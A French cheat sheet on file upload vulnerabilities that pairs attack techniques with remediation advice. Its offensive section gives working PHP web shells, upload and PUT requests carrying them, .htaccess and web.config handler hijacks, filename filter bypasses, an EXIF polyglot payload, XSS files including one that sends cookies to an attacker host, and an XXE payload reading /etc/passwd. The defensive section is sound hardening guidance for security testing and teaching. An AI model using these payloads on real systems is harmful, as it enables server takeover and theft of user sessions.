---
title: "File Upload Cheat Sheet — Vulnérabilités d'Upload de Fichiers"
description: "Cheat sheet offensive et défensive sur les vulnérabilités d'upload de fichiers : web shell, contournement de filtres, race conditions, XSS/XXE et remédiation."
tags:
  - web
  - file-upload
  - web-shell
  - rce
  - xxe
  - xss
  - race-condition
  - magic-bytes
  - polyglot
  - owasp
---

# 📤 Cheat Sheet & Vulnérabilité Web : File Upload (Téléchargement de Fichiers)

!!! warning "Cadre légal"
    Les techniques décrites dans cette fiche ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Généralités, Fonctionnement & Impacts

### 1.1 Définition

Une vulnérabilité **File Upload** est présente lorsqu'un serveur web **autorise le téléversement de fichiers sans valider suffisamment** leur nom, leur type, leur contenu ou leur taille. L'absence — ou l'insuffisance — de l'une de ces quatre vérifications ouvre une surface d'attaque potentiellement critique.

### 1.2 Facteurs d'impact

L'impact réel d'une faille d'upload **dépend directement** :

- des attributs du fichier **non vérifiés** (nom, extension, type MIME, contenu binaire, taille) ;
- des **restrictions appliquées après l'upload** (le fichier déposé est-il accessible publiquement ? Est-il interprété par le serveur ? Dans quel répertoire est-il stocké ?).

Un même défaut de validation peut ainsi mener à des conséquences radicalement différentes selon la configuration serveur en aval.

### 1.3 Pire des cas : Remote Code Execution (RCE)

!!! danger "Web Shell = contrôle total"
    La combinaison d'une **validation de type incorrecte** et d'une **configuration serveur permettant l'exécution de scripts** dans le répertoire de destination (`.php`, `.jsp`, `.asp`, etc.) constitue le scénario le plus critique. Elle permet le dépôt d'un **web shell**, offrant à l'attaquant un accès arbitraire au système de fichiers et, bien souvent, l'**exécution de commandes système** — soit un **contrôle total du serveur**.

### 1.4 Autres impacts

| Impact | Mécanisme |
|---|---|
| **Remplacement de fichiers critiques** | Upload combiné à un *Path Traversal* via le nom de fichier (`../../config/app.conf`), écrasant un fichier légitime du système |
| **Déni de Service (DoS)** | Absence de vérification de la taille du fichier, saturation du disque ou de la bande passante |
| **Stored XSS côté client** | Upload d'un fichier HTML/SVG contenant du JavaScript, exécuté dans le navigateur d'une victime consultant le fichier |
| **Vulnérabilités de parsing (XXE)** | Fichiers structurés (`.docx`, `.xlsx`, `.svg`) traités par un parseur XML mal configuré |

---

## 2. Analyse du Traitement des Fichiers Statiques par le Serveur

Comprendre comment un serveur web **traite** un fichier déposé est indispensable pour évaluer l'impact réel d'une faille d'upload : un fichier malveillant déposé avec succès n'est dangereux que si le serveur l'interprète ou le sert d'une façon exploitable.

### 2.1 Rôle du serveur

Le serveur web analyse généralement **l'extension** du fichier demandé et la met en correspondance avec une table de **types MIME préconfigurés** (directives `AddType`, `AddHandler` sous Apache ; mappings d'extensions sous IIS/Nginx) afin de déterminer le traitement à appliquer.

### 2.2 Fichier non exécutable

Si l'extension correspond à un type de contenu **statique** (image, CSS, HTML brut, PDF), le serveur **envoie directement le fichier au client**, sans aucune interprétation côté serveur.

```text
Requête : GET /uploads/avatar.jpg
Comportement serveur : lecture du fichier sur disque → envoi tel quel au client
```

### 2.3 Fichier exécutable configuré

Si l'extension correspond à un **gestionnaire de script configuré** (ex : `.php` associé au module PHP), le serveur :

1. **Interprète le code** contenu dans le fichier.
2. **Attribue des variables d'environnement** dérivées de la requête HTTP (méthode, en-têtes, paramètres GET/POST).
3. **Renvoie le résultat de l'exécution** au client, et non le code source.

```text
Requête : GET /uploads/shell.php?command=id
Comportement serveur : exécution du script PHP → envoi de la sortie générée (pas du code source)
```

### 2.4 Fichier exécutable non configuré

Si l'extension correspond en théorie à un langage de script, mais que **le handler n'est pas configuré** sur ce répertoire ou ce serveur, deux comportements sont possibles :

- Une **erreur serveur** (404, 500, ou refus explicite).
- L'**affichage du code source en clair**, constituant une **divulgation de code source** potentiellement critique (secrets hard-codés, logique métier, autres vulnérabilités visibles).

!!! info "Croisement avec la fiche Divulgation d'Informations"
    Un fichier exécutable uploadé mais non interprété par le serveur de destination rejoint directement la problématique de divulgation de code source déjà documentée pour les fichiers de sauvegarde (`.bak`, `.old`) : voir la fiche dédiée *Information Disclosure*.

---

## 3. Exploitation Offensive & Vecteurs d'Attaque

### A. Déploiement d'un Web Shell

Un **web shell** est un script malveillant déposé sur le serveur, offrant à l'attaquant une **interface de lecture/écriture arbitraire** sur le système de fichiers et, le plus souvent, l'**exécution de commandes système**.

**Exemples de payloads PHP minimalistes :**

```php
<?php
// Lecture arbitraire de fichier
echo file_get_contents('/path/to/target/file');
?>
```

```php
<?php
// Exécution de commandes système via paramètre GET
echo system($_GET['command']);
?>
```

```php
<?php
// Variante avec plusieurs fonctions d'exécution, utile si certaines sont désactivées (disable_functions)
if (isset($_GET['cmd'])) {
    echo shell_exec($_GET['cmd']);
}
?>
```

!!! danger "Impact"
    Un web shell fonctionnel équivaut, dans la grande majorité des cas, à une **compromission complète du serveur applicatif** et constitue un point de pivot vers le reste de l'infrastructure interne.

### B. Contournement des Validations de Type (Content-Type)

Les uploads de fichiers transitent typiquement via des formulaires encodés en **`multipart/form-data`**, où chaque partie (fichier, champ texte) est séparée par un délimiteur (*boundary*) et porte ses propres en-têtes, dont `Content-Type`.

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Length: 312

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXYZ--
```

!!! warning "Validation naïve basée uniquement sur Content-Type"
    Si le backend se contente de vérifier la valeur déclarée de l'en-tête `Content-Type` **sans inspecter le contenu binaire réel du fichier**, il suffit de **modifier cet en-tête** via Burp Repeater (ex : déclarer `image/jpeg` pour un fichier PHP) pour **tromper entièrement la validation**. Le `Content-Type` déclaré dans une requête `multipart/form-data` est une donnée **entièrement contrôlée par le client** et ne doit jamais faire foi seule.

### C. Contournement des Listes Noires & Fichiers de Configuration

#### Insuffisance des listes noires

Bloquer une liste d'extensions dangereuses connues (`.php`, `.phtml`, `.asp`) est **structurellement insuffisant** : de nombreuses extensions alternatives, souvent méconnues, restent interprétées par les handlers serveur par défaut.

| Extension alternative | Contexte typique |
|---|---|
| `.php5`, `.php7`, `.phtml`, `.pht` | Variantes PHP historiques souvent oubliées des listes noires |
| `.shtml` | Server Side Includes (SSI) Apache |
| `.asa`, `.cer`, `.asax` | Variantes ASP/ASP.NET sur IIS mal configuré |
| `.jsp`, `.jspx`, `.jsw`, `.jsv` | Variantes JSP sur certains serveurs d'application Java |

!!! danger "Les listes noires sont intrinsèquement incomplètes"
    Une liste noire ne peut, par construction, couvrir que les extensions **connues au moment de sa rédaction**. Toute nouvelle variante de handler, toute configuration serveur non standard, ou toute extension propre à un module tiers installé ultérieurement **échappe automatiquement** à la liste. C'est pourquoi une **liste blanche stricte** (section 4) est la seule approche réellement fiable.

#### Détournement de fichiers de configuration locale

Lorsque l'upload d'un fichier de **configuration serveur local** n'est pas bloqué, un attaquant peut **modifier le comportement du serveur** pour le répertoire d'upload lui-même.

**Apache — `.htaccess`**

```apache
# Contenu d'un fichier .htaccess uploadé dans le répertoire cible
AddType application/x-httpd-php .xyz
```

Une fois ce fichier déposé, **toute extension inoffensive** (`.xyz`) devient interprétée comme du PHP dans ce répertoire. Il suffit ensuite d'uploader le web shell renommé :

```bash
# Étape 1 : upload de .htaccess (souvent accepté car extension sans point final classique, ou nom de fichier sans extension reconnue)
curl -F "file=@.htaccess" https://cible.com/upload

# Étape 2 : upload du shell avec une extension triviale désormais interprétée comme PHP
curl -F "file=@shell.xyz" https://cible.com/upload

# Étape 3 : exécution
curl "https://cible.com/uploads/shell.xyz?cmd=id"
```

**IIS — `web.config`**

```xml
<!-- Contenu d'un fichier web.config uploadé dans le répertoire cible -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="xyz_as_php" path="*.xyz" verb="*"
           modules="FastCgiModule"
           scriptProcessor="C:\PHP\php-cgi.exe"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

!!! danger "Dangerosité critique"
    Le dépôt réussi d'un `.htaccess` ou d'un `web.config` dans un répertoire d'upload accessible **redéfinit la politique d'exécution du serveur pour ce répertoire**, rendant caduque toute liste noire d'extensions appliquée uniquement au niveau applicatif. Ces deux noms de fichiers doivent systématiquement figurer parmi les éléments **explicitement interdits** en upload, quelle que soit l'extension déclarée.

#### Obfuscation d'extensions

| Technique | Exemple | Principe du contournement |
|---|---|---|
| **Sensibilité à la casse** | `.pHp`, `.PHP`, `.PhP` | Un filtre comparant la chaîne en minuscules strictes (`== ".php"`) laisse passer les variantes de casse si le handler serveur, lui, est insensible à la casse |
| **Extensions multiples** | `exploit.php.jpg` | Un filtre qui ne vérifie que l'extension finale accepte le fichier ; certains serveurs mal configurés interprètent néanmoins la **première** extension reconnue dans le nom |
| **Caractères de fin superflus** | `exploit.php.`, `exploit.php ` (espace final), `exploit.php::$DATA` (NTFS ADS) | Certains systèmes de fichiers ou serveurs ignorent silencieusement le caractère final lors de l'exécution, tout en le conservant pour la validation du filtre |
| **Encodage URL** | `exploit%2Ephp` (`%2E` = `.`) | Le filtre applicatif analyse la chaîne **avant** décodage URL, tandis que le système de fichiers reçoit la version **décodée** |
| **Octet nul / point-virgule** | `exploit.asp%00.jpg`, `exploit.asp;.jpg` | Historiquement, certains environnements (anciens PHP < 5.3.4, certains serveurs Java/Tomcat) tronquent le nom de fichier à l'octet nul ou au point-virgule, ignorant tout ce qui suit |
| **Caractères Unicode multioctets** | Homoglyphes ou variantes d'encodage d'un point `.` | Contourne des filtres regex non conscients de l'Unicode, tout en étant normalisés différemment par le système de fichiers cible |
| **Nettoyage non récursif** | `exploit.p.phphp` → après suppression de la première occurrence de `php`, devient `exploit.php` | Si le filtre supprime la sous-chaîne `php` **une seule fois** sans boucle récursive, l'injection d'une extension « piégée » reconstitue l'extension dangereuse après le nettoyage |

```bash
# Exemples de noms de fichiers à tester lors d'un audit de filtre d'upload
exploit.pHp
exploit.php.jpg
exploit.php.
"exploit.php "
exploit%2Ephp
exploit.asp%00.jpg
exploit.asp;.jpg
exploit.p.phphp
```

!!! tip "Fuzzing systématique des variantes d'extension"
    Lors d'un audit, automatiser l'envoi de **toutes les variantes** ci-dessus pour une même charge utile, puis comparer les codes de retour HTTP, les messages d'erreur et — surtout — **tenter l'exécution effective** du fichier déposé pour confirmer un contournement réel plutôt qu'une simple acceptation côté upload.

### D. Contournement de la Validation du Contenu

#### Propriétés intrinsèques

Certaines applications valident un fichier image en tentant d'en **extraire les dimensions** via une bibliothèque graphique (GD, ImageMagick, Pillow). Un script PHP brut, dépourvu de structure d'image valide, est alors **rejeté** par cette vérification.

```bash
# Exemple : la bibliothèque échoue à extraire des dimensions d'un fichier qui n'est pas une image réelle
identify shell.php
# identify: no decode delegate for this image format
```

#### Signatures binaires (Magic Bytes)

Chaque format de fichier binaire commence généralement par une **signature fixe** (*magic bytes* / *magic numbers*) permettant d'identifier son type réel, indépendamment de l'extension ou du `Content-Type` déclaré.

| Format | Magic bytes (hexadécimal) |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP (et formats dérivés : `.docx`, `.xlsx`, `.jar`) | `50 4B 03 04` |

```bash
# Inspection des premiers octets d'un fichier
xxd -l 16 fichier_suspect.jpg
```

!!! warning "Validation par magic bytes seule : nécessaire mais non suffisante"
    Vérifier la signature binaire bloque un script PHP brut déguisé en image, mais **ne garantit en rien l'innocuité du reste du fichier**. Un fichier peut parfaitement posséder une signature JPEG valide en en-tête tout en contenant, plus loin dans sa structure, du code malveillant exploitable — c'est précisément le principe des **fichiers polyglottes** ci-dessous.

#### Fichiers Polyglottes

Un **fichier polyglotte** est une image **structurellement valide** (passant la validation de dimensions et de magic bytes) dans laquelle du code malveillant est **injecté dans ses métadonnées** — typiquement les champs **EXIF** — sans en corrompre la structure binaire principale.

```bash
# Injection d'un payload PHP dans le champ de commentaire EXIF d'une image JPEG valide
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image_valide.jpg -o polyglotte.jpg
```

```bash
# Vérification que le payload est bien présent dans les métadonnées
exiftool polyglotte.jpg | grep -i comment
```

!!! danger "Image valide + exécution de code"
    Le fichier `polyglotte.jpg` passe la **validation de dimensions** (c'est une image JPEG réelle et affichable) et la **validation de magic bytes** (signature JPEG correcte en en-tête). Si ce fichier est ensuite **renommé ou accessible via une extension interprétée** (par exemple après un chaînage avec la technique du `.htaccess` en section C, ou via une inclusion de fichier locale — *Local File Inclusion*), le payload PHP contenu dans les métadonnées EXIF est **exécuté par le serveur**.

### E. Exploitation des Race Conditions

**Principe :** de nombreuses architectures d'upload traitent le fichier en **deux temps** : (1) écriture dans un répertoire temporaire ou un *sandbox* le temps d'une vérification — scan antivirus asynchrone, analyse de contenu —, puis (2) **déplacement** vers l'emplacement de stockage définitif si la vérification est positive, ou **suppression** si elle échoue.

```text
Upload reçu → écriture temporaire (/tmp/uploads/<id>) → [FENÊTRE D'OPPORTUNITÉ]
                                                              ↓
                                   Vérification (antivirus, type MIME, etc.)
                                                              ↓
                              Déplacement vers /public/uploads/   OU   Suppression
```

Durant la **fenêtre d'opportunité** entre l'écriture initiale et la décision finale, le fichier est parfois **déjà accessible et exécutable** à son emplacement temporaire ou final avant que la vérification ne se termine.

**Exploitation par tir en rafale**

```text
# Principe d'exploitation avec Turbo Intruder (Burp Suite)
1. Requête A : upload du web shell malveillant
2. Requête B (envoyée en rafale, quasi simultanément) : accès GET au chemin prévisible du fichier uploadé
3. Répétition à très haute fréquence pour maximiser la probabilité de "gagner la course"
   avant la suppression du fichier par le processus de vérification
```

!!! tip "Turbo Intruder : la clé de l'exploitation fiable"
    L'extension **Turbo Intruder** de Burp Suite permet d'envoyer des centaines de requêtes HTTP en un temps minimal avec un contrôle fin du *timing*, ce qui est indispensable pour exploiter de manière fiable une fenêtre de race condition souvent mesurée en millisecondes.

**Cas particulier : uploads via URL**

Certaines applications proposent une fonctionnalité d'upload **par URL distante** (le serveur télécharge lui-même le fichier depuis une adresse fournie par l'utilisateur plutôt que de recevoir un envoi direct). Dans ce cas :

!!! tip "Élargir la fenêtre de course avec du padding"
    En hébergeant un fichier malveillant précédé d'un **padding** important (données inutiles ajoutées pour allonger artificiellement la taille du fichier et donc la durée du téléchargement), l'attaquant **ralentit volontairement** le téléchargement effectué par le serveur distant, élargissant ainsi la fenêtre d'opportunité disponible pour la race condition.

### F. Exploitation sans RCE (XSS & XXE)

#### Stored XSS

Même en l'absence de toute exécution de code serveur, l'upload d'un fichier **interprété par le navigateur** d'une victime constitue un vecteur de **Cross-Site Scripting stocké** :

```html
<!-- Fichier HTML uploadé puis consulté directement par une victime -->
<html>
<body>
<script>
document.location='https://attaquant.com/steal?cookie='+document.cookie;
</script>
</body>
</html>
```

```xml
<!-- Fichier SVG uploadé : le format SVG autorise l'inclusion de JavaScript -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>
```

!!! warning "SVG : un format image... et un document XML exécutable"
    Le format **SVG** est à la fois une image et un document XML pouvant embarquer du JavaScript (`<script>`, attributs `on*`). Autoriser l'upload de fichiers SVG servis directement (plutôt que rastérisés côté serveur) sur le **même domaine** que l'application ouvre une voie de **Stored XSS** classique, indépendamment de toute faille d'exécution serveur.

#### Vulnérabilités de parsing (XXE)

Les formats de documents **complexes basés sur XML** (`.docx`, `.xlsx`, `.pptx` — formats Office Open XML construits sur une archive ZIP de fichiers XML — et `.svg`) sont traités par des **parseurs XML** côté serveur (génération de miniatures, extraction de métadonnées, conversion de format). Un parseur **mal configuré** (résolution des entités externes activée) est vulnérable à l'injection **XXE** (*XML External Entity*).

```xml
<!-- Payload XXE inséré dans un fichier .docx/.xlsx (document.xml au sein de l'archive) 
     ou dans un fichier .svg uploadé -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

!!! danger "Lecture de fichiers arbitraires via un document bureautique"
    Un simple fichier `.docx` ou `.xlsx` malformé, uploadé sur un service générant automatiquement un aperçu ou une extraction de texte côté serveur, peut suffire à **lire des fichiers arbitraires sur le système** si le parseur XML sous-jacent résout les entités externes. Cette classe de vulnérabilité mérite un approfondissement dédié dans une fiche XXE séparée.

### G. Uploader via la Méthode HTTP PUT

Certains serveurs ou API REST exposent la méthode **`PUT`**, permettant de **déposer directement une ressource à une URL spécifique**, sans passer par un formulaire d'upload classique.

```http
PUT /uploads/shell.php HTTP/1.1
Host: cible.com
Content-Type: application/x-httpd-php
Content-Length: 41

<?php system($_GET['cmd']); ?>
```

**Découverte de la méthode PUT**

```bash
curl -i -X OPTIONS https://cible.com/uploads/
```

```http
HTTP/1.1 200 OK
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
```

!!! tip "Vérifier systématiquement l'en-tête Allow"
    La présence de `PUT` dans l'en-tête de réponse `Allow` d'une requête `OPTIONS` indique que la méthode est **activée** sur la ressource testée. Il convient ensuite de tester un dépôt direct, puis de vérifier l'accessibilité et l'éventuelle exécution du fichier déposé à l'URL correspondante.

---

## 4. Mesures de Prévention & Remédiation (Defense-in-Depth)

Aucune mesure isolée n'est suffisante : la protection d'une fonctionnalité d'upload repose sur un **empilement de contrôles indépendants** (*defense in depth*), de sorte que le contournement d'une seule couche ne compromette pas l'ensemble du dispositif.

### 4.1 Liste blanche stricte

!!! danger "Liste blanche, jamais liste noire"
    Autoriser **uniquement** une liste restreinte et explicite d'extensions légitimes, strictement nécessaires au fonctionnement métier (ex : `.jpg`, `.jpeg`, `.png`, `.pdf`). Toute extension **non présente** dans cette liste doit être **rejetée par défaut**, sans exception. Comme détaillé en section 3.C, une liste noire est par nature incomplète et contournable ; seule une liste blanche inverse la charge de la preuve en faveur de la sécurité.

### 4.2 Validation & nettoyage du nom de fichier

- Interdire les **caractères spéciaux** dans le nom de fichier (`/`, `\`, `..`, `:`, `;`, caractères de contrôle).
- Interdire explicitement l'**octet nul** (`%00`) et toute **séquence de traversée de répertoire** (`../`, `..\`).
- Rejeter les noms de fichiers réservés au niveau système (`.htaccess`, `web.config`, `con`, `aux`, `nul` sous Windows).

```python
# Exemple d'expression régulière stricte pour un nom de fichier "sûr" (illustratif)
import re
SAFE_FILENAME = re.compile(r'^[a-zA-Z0-9_\-]{1,100}\.(jpg|jpeg|png|pdf)$')

if not SAFE_FILENAME.match(uploaded_filename):
    raise ValueError("Nom de fichier rejeté")
```

### 4.3 Renommage unique

!!! tip "Ne jamais conserver le nom d'origine fourni par le client"
    Générer systématiquement un **nom de fichier aléatoire cryptographiquement fort** (UUID v4, hachage SHA-256 d'un sel aléatoire + horodatage) pour le stockage final, **indépendamment** du nom original fourni par l'utilisateur. Cette mesure neutralise à elle seule l'intégralité des techniques d'obfuscation d'extension détaillées en section 3.C, puisque le nom client n'est jamais utilisé pour déterminer le nom ou l'extension du fichier stocké.

```python
import uuid, os

extension_autorisee = "jpg"  # déterminée par inspection du contenu réel, jamais par le nom client
nom_stockage = f"{uuid.uuid4()}.{extension_autorisee}"
```

### 4.4 Stockage temporaire isolé (Sandbox)

Valider l'**intégralité du contenu** — magic bytes, analyse antivirus, éventuelle analyse heuristique — dans un **répertoire temporaire isolé**, non accessible publiquement et dépourvu de tout droit d'exécution, **avant** tout déplacement vers l'emplacement de stockage final.

!!! warning "Attention aux race conditions (section 3.E)"
    Le simple fait de disposer d'une étape de validation en sandbox ne suffit pas : il faut également s'assurer que le fichier **n'est jamais accessible ni exécutable** à son emplacement temporaire, et que l'opération de déplacement/suppression est effectuée de façon **atomique** afin d'éliminer toute fenêtre d'exploitation.

### 4.5 Désactivation de l'exécution

!!! danger "La mesure la plus efficace à elle seule"
    Interdire **explicitement l'exécution de scripts** dans tout répertoire destiné aux fichiers uploadés, au niveau de la configuration du serveur web lui-même — indépendamment de toute validation applicative. Même si un attaquant parvient à déposer un web shell malgré toutes les autres protections, un répertoire d'upload **non exécutable** neutralise entièrement l'impact de type RCE.

**Apache — désactivation des handlers dans le répertoire d'uploads**

```apache
<Directory "/var/www/uploads">
    php_admin_flag engine off
    RemoveHandler .php .phtml .php3 .php4 .php5 .pht
    AddType text/plain .php .phtml .php3 .php4 .php5 .pht
    Options -ExecCGI -Indexes
</Directory>
```

**Nginx — servir le répertoire d'uploads sans jamais le transmettre au moteur applicatif**

```nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
        return 403;
    }
    # S'assurer qu'aucun bloc "location ~ \.php$" global ne capture ce chemin avant cette règle
}
```

!!! tip "Isolation radicale : stockage hors racine web ou sur service dédié"
    La protection la plus robuste consiste à stocker les fichiers uploadés **en dehors de la racine web** servie par l'application (accès exclusivement via un endpoint applicatif contrôlé qui relit le fichier depuis le disque) ou sur un **service de stockage objet dédié** (S3 et équivalents), configuré sans aucune capacité d'exécution de code et, idéalement, sur un **domaine ou sous-domaine distinct** de l'application principale — ce qui neutralise également le risque de Stored XSS détaillé en section 3.F.

### 4.6 Synthèse — checklist de remédiation

- [ ] Liste **blanche** stricte d'extensions, validée indépendamment du nom fourni par le client
- [ ] Nom de fichier **entièrement régénéré** (UUID/hash), nom d'origine jamais utilisé pour le stockage
- [ ] Vérification du **type réel** du contenu (magic bytes) en complément — jamais en remplacement — de la liste blanche
- [ ] Limite de **taille** appliquée avant toute écriture sur disque
- [ ] Étape de validation en **sandbox isolé**, sans droit d'exécution, avec déplacement **atomique**
- [ ] **Exécution de scripts désactivée** au niveau du serveur web dans le(s) répertoire(s) d'uploads
- [ ] Fichiers servis, si possible, depuis un **domaine séparé** ou un service de stockage objet dédié
- [ ] Parseurs XML (DOCX/XLSX/SVG) configurés avec **résolution des entités externes désactivée**
- [ ] Dépôt de `.htaccess` / `web.config` explicitement **bloqué**, quelle que soit l'extension déclarée
- [ ] Méthodes HTTP superflues (`PUT`, `DELETE`) **désactivées** sur les répertoires d'upload si non nécessaires

---

## 5. Références

- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [MITRE CWE-434 : Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [MITRE CWE-611 : Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
